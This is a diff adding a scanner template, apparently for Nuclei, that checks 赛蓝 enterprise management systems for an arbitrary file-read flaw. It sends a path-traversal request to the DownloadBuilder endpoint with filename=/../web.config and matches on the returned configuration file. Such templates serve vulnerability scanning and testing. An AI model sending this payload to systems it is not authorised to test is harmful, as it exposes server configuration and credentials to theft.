@@ -1,0 +1,28 @@
+id: poc-yaml-enterprise-management-system-downloadbuilder-anyfile-read
+info:
+  name: 赛蓝企业管理系统 DownloadBuilder 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - raw:
+      - |
+        GET /BaseModule/ReportManage/DownloadBuilder?filename=/../web.config HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+      - type: word
+        words:
+          - "<configuration>"
+        part: body
+      - type: word
+        words:
+          - "application/zip-x-compressed"
+        part: header
+      - type: regex
+        regex:
+          - "attachment;\\s*filename=\\\"/../web\\.config\\\""
+        part: header
